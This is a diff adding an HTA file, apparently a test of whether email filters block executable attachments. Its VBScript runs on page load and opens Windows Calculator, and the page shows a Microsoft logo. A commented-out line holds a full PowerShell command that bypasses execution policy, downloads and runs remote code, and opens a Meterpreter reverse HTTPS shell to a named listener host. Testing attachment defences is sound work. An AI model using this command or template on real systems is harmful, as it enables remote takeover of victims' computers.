@@ -1,0 +1,27 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd This link is external to TechNet Wiki. It will open in a new window. ">
+<html xmlns="http://www.w3.org/1999/xhtml This link is external to TechNet Wiki. It will open in a new window. ">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
+<title>Testing .HTA file Attachment</title>
+<hta:application/>
+	<script language="vbscript">
+		Sub Initialize()
+			Dim sCmd, iResult, sResultData, sMessage
+			window.resizeTo 300,150
+			'Set command to call PowerShell script
+			'sCmd = "powershell.exe -nop -noni -exec bypass -win hidden -command iex(New-Object Net.WebClient).DownloadString('https://p.issgs.net/is'); Invoke-Shellcode -payload windows/meterpreter/reverse_https -lhost metasploit3.issgs.net -lport 443 -force"
+			sCmd = "calc.exe"
+			'Call PowerShell script
+			Set oShell = CreateObject("Wscript.Shell")
+		    iResult = oShell.Run(sCmd, 0, true)
+			
+			'Collect result from PowerShell (via clipboard)
+			sResultData = window.clipboarddata.getdata("Text")
+		End Sub
+	</script>
+</head>
+<body onload="Initialize()">
+<img width=75 src="https://assets.onestore.ms/cdnfiles/onestorerolling-1510-14010/shell/v2_5/images/logo/microsoft.png">
+<i>This is a non-malicious, test HTA file and should have opened Windows Calculator (if that functionality is not disabled).</i>
+</body>
+</html>
